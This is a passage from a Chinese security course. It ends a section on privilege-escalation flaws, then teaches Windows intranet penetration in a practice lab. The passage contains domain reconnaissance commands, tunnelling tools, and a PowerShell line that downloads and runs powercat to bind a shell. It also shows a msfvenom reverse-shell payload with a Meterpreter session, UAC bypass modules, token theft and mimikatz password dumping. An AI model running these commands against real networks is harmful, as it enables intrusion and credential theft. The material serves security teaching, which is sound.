对于安全很关键的对象。不要像前面的靶场题目那样，密码验证过后，后续
的敏感对象操作都不再验证，这样很容易导致漏洞。</li>

<li><b>最低权限原则</b> ：只授予执行操作所必需的最小访问权限，并且对于该访问
权只准许使用所需的最少时间。</li>

<li><b>前后端双重验证</b> ：在涉及敏感操作行为时，前端与后端同时对用户输入数
据进行权限校验，尤其是前端校验特别容易被改包绕过。</li>

<li><b>对于特别敏感的操作增设密码或安全问题等验证方式</b> ：比如修改密码要求
输入原密码。</li>
</ol>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
<code>越权漏洞属于业务逻辑型漏洞</code> ， <code>常见一些业务功能场景，比如查看和修改
个人信息、账号登录等功能</code> 。但它又不是一种固定漏洞场景的漏洞， <code>依赖于
业务处理逻辑，所以手工测试和半自动化测试是主要的检测手段</code> 。当前的一些
全自动化检测越权，主要是替换用户凭证相关信息来重放请求，根据响应结果的
比对判断，思路与在越权漏洞的检测与利用一小节中介绍的工具检测原理类似。
</p>

<p>
<code>越权漏洞常被分为水平越权和垂直越权两种</code> ，根据越权对象的权限等级来划
分的，同级的就是水平越权，由低向高权限越权就是垂直越权。你还记得开篇提
到的“明星健康宝照片被泄露”事件吗？你认为它属于水平越权还是垂直越权呢？
欢迎在评论区留言讨论。
</p>
</div>
</div>
</section>
<section id="outline-container-h:7daae3c6-2533-4f78-b0e3-8788960eca92" class="outline-2">
<h2 id="h:7daae3c6-2533-4f78-b0e3-8788960eca92">内网渗透：内网的员工电脑是怎么被外部黑掉的？</h2>
<div class="outline-text-2" id="text-h:7daae3c6-2533-4f78-b0e3-8788960eca92">
<p>
前面我已经介绍了很多常见的 Web漏洞攻防相关的知识，在攻击者拿下外网服务
器之后，他们可能进一步向内网渗透。
</p>

<p>
<code>企业往往对外网进行重兵把守，但对内网安全又常常被忽视</code> ，因为多数人觉
得反正身处内网，外面又访问不到，一些安全漏洞也不进行修复，防御系统也不
部署，内网安全问题可谓千疮百孔。
</p>

<p>
内网渗透主要是针对企业员工电脑为主，大多是 Windows 机器，虽然现在 Mac
办公也慢慢流行起来了，但 Windows 仍是主流，所以本课程主要以 <code>针对Windows内网的渗透攻击与防御为背景，介绍一些常用的内网渗透手法，以及相
应的安全防御策略</code> 。
</p>
</div>
<div id="outline-container-内网靶场搭建" class="outline-3">
<h3 id="内网靶场搭建">内网靶场搭建</h3>
<div class="outline-text-3" id="text-内网靶场搭建">
<p>
国内的红日安全团队曾提供内网渗透实战靶场的下载（大小共 13 G），你可以
从百度网盘上下载，如果自己从头搭建测试环境的话，配置流程相当麻烦。
</p>

<blockquote>
<p>
链接：<a href="https://pan.baidu.com/s/1qzpnP7vHRp8AGe5wb3QjZw?pwd=9m9w">https://pan.baidu.com/s/1qzpnP7vHRp8AGe5wb3QjZw?pwd=9m9w</a> 
提取码：9m9w 
</p>

<p>
系统登录密码：hongrisec@2019，登录后可能会要求你更改密码
</p>
</blockquote>

<p>
如靶场的内网拓扑结构图所示，共涉及 3 台虚拟机。
</p>


<figure id="org59df251">
<img src="./images/CioPOWAeEO6AG9AkAAEj8_JosNU947.png" alt="CioPOWAeEO6AG9AkAAEj8_JosNU947.png" width="80%">

</figure>

<p>
图 1 靶场的内网拓扑结构图
</p>

<p>
这 3 台虚拟机分别如下。
</p>

<p>
VM1：Windows 7 x64，开放 Web 服务的服务器
</p>

<p>
VM2：Win2K3 Metasploitable，内网机器
</p>

<p>
VM3：Windows Server 2008 R2 x64，内网机器，域控服务器（关于域控的介绍
见下文）
</p>


<figure id="org1f91a85">
<img src="./images/Cgp9HWAfY0eAfE1WAAMYLHntmgU570.png" alt="Cgp9HWAfY0eAfE1WAAMYLHntmgU570.png" width="80%">

</figure>

<p>
图 2 内网靶场虚拟机
</p>

<p>
靶场练习的攻击目的就是在攻破 VM1 拿到 webshell 之后，继续向内网的 VM2
和VM3 机器进行渗透，最终拿到域控服务器的最高权限。
</p>
</div>
</div>
<div id="outline-container-内网基础知识" class="outline-3">
<h3 id="内网基础知识">内网基础知识</h3>
<div class="outline-text-3" id="text-内网基础知识">
<p>
内网渗透 <code>很多时候是针对域的渗透</code> ，常见于 Windows系统，所以下面重点介绍下
内网中 Windows 系统中常见的一些概念，以便后续介绍内网渗透技术时容易理解。
</p>
</div>
<div id="outline-container-域" class="outline-4">
<h4 id="域">1.域</h4>
<div class="outline-text-4" id="text-域">
<p>
域（Domain）是将网络中的多台计算机通过逻辑的方式组织到一起，进行集中管
理的环境。用户以合法身份登录域后，就可以访问域内的资源，默认另一个域中
的用户无法访问另一个域中的资源。
</p>

<p>
举例个应用场景：公司内有 1000 台计算机，需要在每台计算机上创建一个叫
lagou的统一用户，按传统方法就是一台台去建号并设置密码，一旦要改密码又
要一台台去修改。
</p>

<p>
如果通过域来统一管理就方便多了，在域中通过活动目录（域中提供目录服务的
组件，可用于存储网络对象，比如账号、计算机、共享资源、打印机和联系人等
信息）创建lagou 账号就可在 1000 台计算机任意一台中登录，更改密码也同样
适用。
</p>

<p>
通过查看计算机属性可获取一些域信息：
</p>


<figure id="org31f65ff">
<img src="./images/Cgp9HWAeEQaAVj9BAAAXrb5SArk412.png" alt="Cgp9HWAeEQaAVj9BAAAXrb5SArk412.png" width="80%">

</figure>

<p>
图 3 计算机属性信息
</p>

<p>
但是在实际渗透过程中，我们常常会使用一些命令，比如下面这些方法。
</p>

<p>
通过 ipconfig 命令可以判断当前服务器是否存在域，如下图中显示的 god.org
就是其所处的域：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">ipconfig /all
</pre>
</div>


<figure id="org24f3581">
<img src="./images/Cgp9HWAeEQ2AJhh5AAAikI0lX0Y455.png" alt="Cgp9HWAeEQ2AJhh5AAAikI0lX0Y455.png" width="80%">

</figure>

<p>
图 4 通过 ipconfig 命令判断是否存在域
</p>

<p>
如果存在域中，还可以使用以下命令查看指定用户的详细信息：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">net user xxx /domain
</pre>
</div>


<figure id="org1b2e1e1">
<img src="./images/Cgp9HWAeERWADJYhAAAnZIqI-D8292.png" alt="Cgp9HWAeERWADJYhAAAnZIqI-D8292.png" width="80%">

</figure>

<p>
图 5 查看域用户信息
</p>

<p>
如果你想查看域内有哪些机器，还可通过执行以下命令实现：
</p>

<div class="org-src-container">
<pre class="src src-lang-java"># 查询域名
net view /domain
# 查询域内所有计算机
net view /domain:{域名}
</pre>
</div>


<figure id="org9e45b61">
<img src="./images/CioPOWAeERyAT5rjAAAS8yoAmXw757.png" alt="CioPOWAeERyAT5rjAAAS8yoAmXw757.png" width="80%">

</figure>

<p>
图 6 查询域内所有计算机
</p>

<p>
如果你想查询域内所有用户组列表，可以使用以下命令：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">net group /domain
</pre>
</div>


<figure id="org2910f77">
<img src="./images/CioPOWAeESSAH-ZkAAAaJdSwOEE769.png" alt="CioPOWAeESSAH-ZkAAAaJdSwOEE769.png" width="80%">

</figure>

<p>
图 7 查询域内所有用户组列表
</p>

<p>
上面介绍几条命令主要用于获取域内常用信息时使用的，可以帮助我们进一步渗透时收集信用使用。
</p>
</div>
</div>
<div id="outline-container-域控制器" class="outline-4">
<h4 id="域控制器">2.域控制器</h4>
<div class="outline-text-4" id="text-域控制器">
<p>
域控制器是域中拥有管理域内其他主机的计算机，它负责所有本域内的计算和用
户的验证工作，它是整个域的通信枢纽，域内所有用来验证身份的账号和密码哈
希都存在域控制器中。所以，内网渗透的最终目标常常就是为了攻下域控服务器，
这样就等同于控制整个域内的计算机。
</p>

<p>
通过 nltest 命令可以查看域控制器的机器名，下图显示的域控制器机器名为
OWA。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">nltest /DCLIST:{域名}
</pre>
</div>


<figure id="orgdd93fa9">
<img src="./images/Cgp9HWAeES2AAURlAAAYxuOOMQQ920.png" alt="Cgp9HWAeES2AAURlAAAYxuOOMQQ920.png" width="80%">

</figure>

<p>
图 8 查看域控制器的机器名
</p>

<p>
然后通过前面介绍的 ipconfig/all 来查看当前主机的机器名是否为域控制器。
</p>

<p>
有时一个域内会存在两台或两台以上的域控制器，我们可以通过以下命令来查看
域控制器组内的所有域控制器的主机名：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">net group "Domain Controllers" /domain
</pre>
</div>


<figure id="org8b4f6bb">
<img src="./images/Cgp9HWAeETaANehWAAAUW2JBZak736.png" alt="Cgp9HWAeETaANehWAAAUW2JBZak736.png" width="80%">

</figure>

<p>
图 9 查看所有域控制器的主机名
</p>

<p>
查看域管理员，下图显示是 Administrator：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">net group "domain admins" /domain
</pre>
</div>


<figure id="orgafa98aa">
<img src="./images/CioPOWAeET2AQFjTAAATkdoqwP4465.png" alt="CioPOWAeET2AQFjTAAATkdoqwP4465.png" width="80%">

</figure>

<p>
图 10 查看域管理员
</p>

<p>
所以这台叫 OWA 机器名的域控制器就是我们内网渗透的攻击目标，正是它上面
登录着域管理员账号，也是为了方便后面我们从域控中导出域管理员的密码。
</p>

<p>
那这台机器对应的 IP 是什么呢？有两种常用方法。
</p>

<ul class="org-ul">
<li>查询 DNS 服务器，因为它与域控制器常常在同一台服务器上。</li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-java">nslookup {域名}
</pre>
</div>


<figure id="org274c931">
<img src="./images/Cgp9HWAeEUWAIGZWAAAQDfvLnvs583.png" alt="Cgp9HWAeEUWAIGZWAAAQDfvLnvs583.png" width="80%">

</figure>

<p>
图 11 查询 DNS 服务器
</p>

<ul class="org-ul">
<li>扫描内网主机，寻找对应机器名的IP，比如用<a href="https://github.com/lifenjoiner/nbtscan/releases/download/nbtscan-v1.5.2-2394b4/nbtscan-v1.5.2-2394b4-win32.7z">nbtscan工具</a>，它就是利用
NetBIOS协议去进行机器名查询解析应答的过程以探测内网主机。</li>
</ul>


<figure id="org24191cb">
<img src="./images/CioPOWAfY12AHyFVAADWvNQT2YE315.png" alt="CioPOWAfY12AHyFVAADWvNQT2YE315.png" width="80%">

</figure>

<p>
图 12 利用 nbtscan 扫描内网主机
</p>

<p>
基于上述方法的输出结果，我们可以知道域控制器 IP 为 192.168.52.138。
</p>
</div>
</div>
<div id="outline-container-域关系" class="outline-4">
<h4 id="域关系">3.域关系</h4>
<div class="outline-text-4" id="text-域关系">
<p>
一台台计算机组成一个域，称为单域。
</p>

<p>
出于管理或其他需求，可能将一个域分成多个域来管理，就像公司分成几个部分
一样，那么公司层面的域称为父域，部门层面的域称为子域。
</p>

<p>
父子域与域名中的一级域名、二级域名的概念类似，比如 test.baidu.com 是
baidu.com 的二级域，父域是 baidu.com，子域是 test.baidu.com。
</p>

<p>
这些父子域称成了域树，一个个域树建立起来的组合称为域森林，简单域林。
</p>


<figure id="org5736b30">
<img src="./images/CioPOWAeEViAKOJIAAEtcglxU5U255.png" alt="CioPOWAeEViAKOJIAAEtcglxU5U255.png" width="80%">

</figure>

<p>
图 13 域关系图
</p>
</div>
</div>
</div>
<div id="outline-container-内网信息收集" class="outline-3">
<h3 id="内网信息收集">内网信息收集</h3>
<div class="outline-text-3" id="text-内网信息收集">
<p>
前面已经介绍一些获取域信息的常见命令，包含如何判断是否存在域、域名查询、
用户名查询、定位域控制器等方法，因此这些内容不再赘述。
</p>

<p>
下面介绍两款比较自动化获取内网信息的工具：Empire 和BloodHound。除此之
外还有其他工具，比如Metasploit、PowerView、Seatbelt、WMIC等等，你可以
在后面自行搜索相关工具和资料继续扩展学习。
</p>
</div>
<div id="outline-container-empire-后渗透利器" class="outline-4">
<h4 id="empire-后渗透利器">1.Empire 后渗透利器</h4>
<div class="outline-text-4" id="text-empire-后渗透利器">
<p>
这里推荐一款叫 <a href="https://github.com/EmpireProject/Empire">Empire</a> 的内网渗透利器来自动收集内网信息。你可以先用
Empire 生成后门，然后上传到目标机器上执行，如果你已经拿到 webshell，那
可以先把后门可执行文件放置在外网服务器上，再用 webshell 下载执行。若是
纯内网机器，那就通过外网 Web服务器下载好后，再传给内网机器。
</p>

<p>
下面介绍一些常用的功能模块和使用命令：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">＃收集主机信息，包括本机用户、域组成员、系统基本信息、共享信息等等
&gt; usemodule situational_awareness/host/winenum
&gt; execute

＃探测内网存活机器
&gt; usemodule situational_awareness/network/arpscan
&gt; set Range 192.168.52.0-192.168.52.255
&gt; execute

＃搜索域管理员登录的机器
&gt; usemodule situational_awareness/network/powerview/user_hunter
&gt; execute

＃获取主机账号和密码
&gt; mimikatz
&gt; creds
</pre>
</div>

<p>
由于篇幅所限，没法把 Empire的方方面面都介绍一遍，否则这一篇文章也写不
完，还是推荐你看下<a href="https://blog.csdn.net/Fly_hps/article/details/80563407">《后渗透测试神器Empire的详解》</a>这篇文章，以及<a href="https://github.com/EmpireProject/Empire/wiki">官方WiKi
文档</a>。
</p>
</div>
</div>
<div id="outline-container-bloodhound-域分析工具" class="outline-4">
<h4 id="bloodhound-域分析工具">2.BloodHound 域分析工具</h4>
<div class="outline-text-4" id="text-bloodhound-域分析工具">
<p>
BlooadHound 是一款自动化分析并提取域信息的免费工具，它通过图与线的形式，
将各类主机、用户、组、会话等信息之间的关系可视化地展示出来。
</p>


<figure id="orga50116c">
<img src="./images/Cgp9HWAfY2yAAEGRAABdkWCTiXQ008.png" alt="Cgp9HWAfY2yAAEGRAABdkWCTiXQ008.png" width="80%">

</figure>

<p>
图 14 Bloodhound
</p>

<p>
该工具最有用也是最常用的一个功能就是提供攻击域控的最短路径，可以帮助我
们更快地攻下域控服务器。
</p>


<figure id="org3814f9f">
<img src="./images/Cgp9HWAeEXSANSPOAAEqJIowHsQ844.png" alt="Cgp9HWAeEXSANSPOAAEqJIowHsQ844.png" width="80%">

</figure>

<p>
图 15 查找域管理员的最短路径
</p>

<p>
关于 Bloodhound 的安装和使用，更多信息可参考<a href="https://www.cnblogs.com/backlion/p/10643132.html">BloodHound官方使用指南</a>。
</p>
</div>
</div>
</div>
<div id="outline-container-通信隧道建设" class="outline-3">
<h3 id="通信隧道建设">通信隧道建设</h3>
<div class="outline-text-3" id="text-通信隧道建设">
<p>
为进一步的内网渗透，通常会建立一个通信隧道，一方面便于与无法直边的内网
机器交互，一方面为了绕过防火墙端口屏蔽的安全限制。
</p>

<p>
你可以先用以下命令来判断是否允许访问外网，利用不同协议来判断会更全面一些：
</p>

<ul class="org-ul">
<li>ping：基于 ICMP 协议</li>

<li>curl：基于 HTTP 协议</li>

<li>netcat：基于 TCP 协议</li>

<li>nslookup：基于 DNS 协议</li>
</ul>

<p>
看哪些通信协议可以出网的，就可以尝试利用它来建立起内网通信隧道，下面介
绍一些常用的通信隧道建设方法。
</p>
</div>
<div id="outline-container-pingtunnel" class="outline-4">
<h4 id="pingtunnel">1.PingTunnel</h4>
<div class="outline-text-4" id="text-pingtunnel">
<p>
<a href="http://freshmeat.sourceforge.net/projects/ptunnel/">PingTunnel</a>
是一款基于 ICMP 协议的通信隧道工具。
</p>

<p>
<code>ICMP经常是被忽略的防火墙忽略的通信协议，所以有时可以通过它绕过防火墙
的限制</code> ；另外还有一个更大好处是， <code>通过 PingTunnel 可以间接访问到内网
服务器</code> 。比如攻击者 A 攻下服务器 B，服务器 B跟内网服务器 C 连通，但 A
无法直连C，这时通过建立起 ICMP隧道即可解决此问题。
</p>

<p>
它的使用方法如下：
</p>

<ul class="org-ul">
<li><p>
先在跳板机（一般取开放 Web 的服务器，即最早被我们拿到 webshell
权限的服务器）上运行以下命令开启后门。
</p>

<div class="org-src-container">
<pre class="src src-sh">ptunnel -x {&#36830;&#25509;&#23494;&#30721;}
</pre>
</div></li>

<li><p>
再在攻击者机器上运行以下命令去连接。
</p>

<div class="org-src-container">
<pre class="src src-sh">ptunnel -p {&#36339;&#26495;&#26426;IP} -lp {&#26412;&#22320;&#30417;&#21548;&#31471;&#21475;} -da {&#30446;&#26631;IP} -dp {&#30446;&#26631;&#26426;&#22120;&#31471;&#21475;} -x {&#36830;&#25509;&#23494;&#30721;}
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-lcx-端口转发" class="outline-4">
<h4 id="lcx-端口转发">2.lcx 端口转发</h4>
<div class="outline-text-4" id="text-lcx-端口转发">
<p>
lcx 是一款常用的轻便的端口转发工具，它是基于 Socket 实现的，常用于转发
数据到防火墙许可的服务器或端口上，其使用方法如下：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#26412;&#26426;&#31471;&#21475; 111 &#30340;&#36890;&#20449;&#25968;&#25454;&#36716;&#21457;&#21040;&#26412;&#26426;&#31471;&#21475; 222</span>
lcx.exe -listen 111 222

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#30446;&#26631;&#26426;&#22120;&#31471;&#21475;3389&#30340;&#36890;&#20449;&#25968;&#25454;&#36716;&#21457;&#21040;&#20844;&#32593;&#26426;&#22120;&#31471;&#21475;4444</span>
lcx.exe -slave {&#20844;&#32593;IP} 4444 127.0.0.1 3389

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35775;&#38382;&#26412;&#22320;&#31471;&#21475;111&#21363;&#35775;&#38382;&#30446;&#26631;IP&#30340;3389&#31471;&#21475;</span>
lcx.exe -tran 111 {&#30446;&#26631;IP} 3389
</pre>
</div>
</div>
</div>
<div id="outline-container-powercat" class="outline-4">
<h4 id="powercat">3.PowerCat</h4>
<div class="outline-text-4" id="text-powercat">
<p>
PowerCat 是 netcat 的 PowerShell 版本，它允许本地执行，也可远程执行。常
用的远程执行命令如下，下载 PowerShell 脚本进行执行，它会在本地监听 8000
端口，并关联 cmd：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">powershell “IEX (New-Object
System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat
-l -p 8000 -e cmd”
</pre>
</div>

<p>
然后攻击者主动连接 8000 端口，即可获取 shell 权限。
</p>
</div>
</div>
<div id="outline-container-ssh" class="outline-4">
<h4 id="ssh">4.SSH</h4>
<div class="outline-text-4" id="text-ssh">
<p>
几乎所有的 Linux/Unix 服务器都会支持 SSH 协议，在针对此类操作系统的攻
击时就可以派上用场，用它来做代理和转发。
</p>

<p>
常用命令如下：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#36890;&#36807;&#36339;&#26495;&#26426;&#35775;&#38382;&#30446;&#26631;IP</span>
ssh -CNfg -L 2121:{&#30446;&#26631;IP}:21 root@{&#36339;&#26495;&#26426;IP}

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35775;&#38382;&#25915;&#20987;&#32773;IP&#30340;2121&#31471;&#21475;&#65292;&#21363;&#26159;&#35775;&#38382;&#30446;&#26631;IP</span>
ssh -CNfg -R 2121:BIP:{&#30446;&#26631;IP} root@{&#25915;&#20987;&#32773;IP}
</pre>
</div>
</div>
</div>
<div id="outline-container-earthworm" class="outline-4">
<h4 id="earthworm">5.EarthWorm</h4>
<div class="outline-text-4" id="text-earthworm">
<p>
<a href="https://github.com/idlefire/ew">EarthWorm</a> 是一款用于开启 SOCKS v5代理服务的工具，基于标准 C开发，可提
供多平台间的转接通信，用于复杂网络环境下的数据转发。
</p>

<p>
它的常用命令如下：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312;&#30446;&#26631;&#26426;&#22120;&#20013;&#24320;&#21551;SOCKS&#20195;&#29702;</span>
ew -s ssocksd -l 888

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312;&#36339;&#26495;&#26426;&#19978;&#25191;&#34892;&#22914;&#19979;&#21629;&#20196;&#23454;&#29616;&#25968;&#25454;&#36879;&#20256;&#21040;&#30446;&#26631;&#26426;&#22120;&#19978;&#65292;&#21363;&#23558;1080&#31471;&#21475;&#25968;&#25454;&#36716;&#21457;&#21040;&#30446;&#26631;IP&#30340;888&#31471;&#21475;&#19978;</span>
ew -s lcx_tran -l 1080 -f {&#30446;&#26631;&#26426;&#22120;IP} -g 888
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-权限提升" class="outline-3">
<h3 id="权限提升">权限提升</h3>
<div class="outline-text-3" id="text-权限提升">
<p>
有时我们利用 Web漏洞拿到的系统权限是有限制的，为了获取更高的权限，我们
就常常使用一些提权的利用方法来实现，下面介绍几种在Windows 平台下比较常
用的提权方法。
</p>

<blockquote>
<p>
补充：为方便本地虚拟机与主机互联测试，我修改了原靶场虚拟机的 IP
地址，将192.168.52.xx 都更改为 192.168.69.xx。
</p>
</blockquote>
</div>
<div id="outline-container-利用系统软件漏洞提权" class="outline-4">
<h4 id="利用系统软件漏洞提权">1.利用系统/软件漏洞提权</h4>
<div class="outline-text-4" id="text-利用系统软件漏洞提权">
<p>
操作系统本身也有一些漏洞，特别是内核漏洞，常常用来帮助攻击者拿到更高的
权限。还有一些拥有驱动程序的软件，比如杀毒软件，这些软件的权限都比较高，
如果存在漏洞被利用，也可用于提权。
</p>

<p>
下面以靶场为例来实践练习下，先在攻击者本地开启监听端口，以等待后门回连：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.69.1 ＃攻击者IP
LHOST =&gt; 192.168.69.1
msf5 exploit(multi/handler) &gt; set LPORT 4444
LPORT =&gt; 4444
msf5 exploit(multi/handler) &gt; exploit
[*] Started reverse TCP handler on 192.168.69.1:4444
</pre>
</div>

<p>
然后生成回连后门程序 shell.exe，上传到目标服务器（已获得 webshell
的服务器）并运行：
</p>

<pre class="example" id="org8fdd031">
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.52.133 LPORT=443 -f exe -o shell.exe
</pre>

<p>
利用成功后获得系统 shell 权限：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">msf5 exploit(multi/handler) &gt; exploit
[*] Started reverse TCP handler on 192.168.69.1:4444 
[*] Sending stage (176195 bytes) to 192.168.69.143
[*] Meterpreter session 1 opened (192.168.69.1:4444 -&gt; 192.168.69.143:32552) at 2021-01-24 20:55:13 +080
meterpreter &gt; shell
Process 2364 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����
C:\Users\Administrator\Desktop&gt;whoami
whoami
god\administrator
C:\Users\Administrator\Desktop&gt;exit
exit
meterpreter &gt; getuid
Server username: GOD\Administrator
meterpreter &gt; background
[*] Backgrounding session 1...
</pre>
</div>

<p>
利用 post/multi/recon/local_exploit_suggester
模块去获取系统的未修复的漏洞，同时 metasploit 还有对应利用模块的漏洞：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">msf5 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) &gt; set session 1
session =&gt; 1
msf5 post(multi/recon/local_exploit_suggester) &gt; exploit
</pre>
</div>


<figure id="org15a497c">
<img src="./images/Cgp9HWAfY4GAQcMKAAL5SxNj3Q4699.png" alt="Cgp9HWAfY4GAQcMKAAL5SxNj3Q4699.png" width="80%">

</figure>

<p>
图 16 利用 local_exploit_suggester 获取未修复且可利用的漏洞
</p>

<p>
根据上述信息可以知道，系统上还是不少漏洞可直接利用的，你可以挑选内核漏洞去利用。
</p>

<p>
不过这里还有个更简单的方法，就是利用 getsystem 命令去获取 SYSTEM
权限，如下图所示。
</p>


<figure id="org06cc9d0">
<img src="./images/Cgp9HWAeEaWAPN3CAABEa5FU48c948.png" alt="Cgp9HWAeEaWAPN3CAABEa5FU48c948.png" width="80%">

</figure>

<p>
图 17 利用 getsystem 提权
</p>
</div>
</div>
<div id="outline-container-绕过-uac" class="outline-4">
<h4 id="绕过-uac">2.绕过 UAC</h4>
<div class="outline-text-4" id="text-绕过-uac">
<p>
即使是 Administrator 权限，有时在执行程序时会失败，相信你对下图的弹框
不会陌生。这就是UAC（用户账户控制），其原理是通知用户是否对应用程序使
用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统的效果。
</p>


<figure id="orgccfe245">
<img src="./images/Cgp9HWAeEayAQhAQAACp3hxvVs4058.png" alt="Cgp9HWAeEayAQhAQAACp3hxvVs4058.png" width="80%">

</figure>

<p>
图 18 UAC 导致的弹框
</p>

<p>
关于绕过 UAC 的原理，我们此处展开讨论，这里推荐几个 Metasploit
自带的利用模块来绕过 UAC：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask
</pre>
</div>

<p>
你是不是发现 Metasploit功能很强大？它什么功能都有，后面的利用，我们还
会继续使用到它。
</p>
</div>
</div>
<div id="outline-container-令牌窃取" class="outline-4">
<h4 id="令牌窃取">3.令牌窃取</h4>
<div class="outline-text-4" id="text-令牌窃取">
<p>
令牌是系统中的临时分配的认证凭证，等同于账号、密码，决定是否允许当前请
求及其所属用户。也就是说，获得令牌后，用户可以在不提供密码的情况下访问
网络和系统资源。如果被攻击者窃取到，就等同于窃取了他人账号。
</p>

<p>
在 Metasploit 中可使用 incognito 去罗列当前系统中的有效 Token并进行复
制伪造，如下图所示，假冒“NT AUTHORITY\SYSTEM”令牌成功获取系统管理员
权限。
</p>


<figure id="org2c5055a">
<img src="./images/CioPOWAeEbWAfYtIAADYedlIyJY442.png" alt="CioPOWAeEbWAfYtIAADYedlIyJY442.png" width="80%">

</figure>

<p>
图 19 令牌窃取
</p>
</div>
</div>
</div>
<div id="outline-container-横向移动渗透" class="outline-3">
<h3 id="横向移动渗透">横向移动渗透</h3>
<div class="outline-text-3" id="text-横向移动渗透">
<p>
为了扩大攻击成果，攻击者通常会利用已被攻破的系统作为跳板，去访问域内的
其他主机，试图获得更多主机的控制权，下面介绍一些常用的横向移动渗透手段。
</p>
</div>
<div id="outline-container-抓取密码" class="outline-4">
<h4 id="抓取密码">1.抓取密码</h4>
<div class="outline-text-4" id="text-抓取密码">
<p>
在 Windows 上抓取密码的工具，最著名的当属 mimikatz，在 Metasploit
中也有集成，直接通过 load mimikatz 命令即可加载使用。
</p>

<div class="org-src-container">
<pre class="src src-sh">meterpreter &gt; load mimikatz
Loading extension mimikatz...[!] Loaded x86 Mimikatz on an x64 architecture.
[!] Loaded Mimikatz on a newer OS (Windows 7 (6.1 Build 7601, Service Pack 1)<span style="color: #483d8b;">.</span>)<span style="color: #483d8b;">.</span> Did you mean to <span style="color: #8b2252;">'load kiwi'</span> instead?
Success.
meterpreter &gt; help
...
Mimikatz Commands
=================
    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom command
    msv               Attempt to retrieve msv creds (hashes)
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds
meterpreter &gt; wdigest
</pre>
</div>

<p>
由于 Metasploit 默认加载的是 32 位的 Mimikatz 程序，在 x64机器上运行会
导致 wdigest 读取密码失败了，只能获取密码哈希。
</p>


<figure id="org4f3f0a1">
<img src="./images/Cgp9HWAeEcKAPB1IAAF7z9fhxL0342.png" alt="Cgp9HWAeEcKAPB1IAAF7z9fhxL0342.png" width="80%">

</figure>

<p>
图 20 获取密码哈希
</p>

<p>
这种情况下，只能自己上传 64 位的 mimikatz程序去获取明文密码，可以从<a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip">官
方下载</a>，运行mimikatz 后通过以下两条命令，即可实现明文密码的获取：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25552;&#21319;&#26435;&#38480;</span>
privilege::debug 

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25628;&#32034;&#26126;&#25991;&#23494;&#30721;</span>
sekurlsa::logonpasswords
</pre>
</div>


<figure id="orgd5b759c">
<img src="./images/CioPOWAeEcmAdN4ZAABC3Bc6dFs102.png" alt="CioPOWAeEcmAdN4ZAABC3Bc6dFs102.png" width="80%">

</figure>

<p>
图 21 获取系统的账号与密码
</p>

<p>
除了 Mimikatz 外，还可以利用 hashdump 可导出当前机器的密码 Hash：
</p>


<figure id="org1e56c0d">
<img src="./images/CioPOWAeEdGAWOPMAAFVZckrEAI446.png" alt="CioPOWAeEdGAWOPMAAFVZckrEAI446.png" width="80%">

</figure>

<p>
图 22 利用 hashdump 可导出当前机器的密码 Hash
</p>

<p>
利用 smart_hashdump 还可以获取域内用户的密码 Hash，但需要 system 权限：
</p>


<figure id="org0b26f00">
<img src="./images/Cgp9HWAfY5WAYTl7AALWnzNVoVk263.png" alt="Cgp9HWAfY5WAYTl7AALWnzNVoVk263.png" width="80%">

</figure>

<p>
图 23 利用 smart_hashdump 导出域内用户的密码 Hash
</p>

<p>
如果只有 hash，那就需要结合 hashcat 来破解出明文密码，有时也可采用哈希
传递攻击的方式去利用，即利用域内一些账号密码相同的情况，直接将密码哈希
传递给其他计算机去尝试登录的攻击方式，可以不必花时间破解密码明文，
Mimikatz 就支持哈希传递攻击。
</p>

<p>
前面我们已经知道这里 Administrator 是域管理员，并且刚刚已经获取到密码
是hongrisec@2019，那么接下来我们就可以尝试拿下更多的内网机器，进一步横
向移动渗透。
</p>
</div>
</div>
<div id="outline-container-账号密码连接" class="outline-4">
<h4 id="账号密码连接">2.账号密码连接</h4>
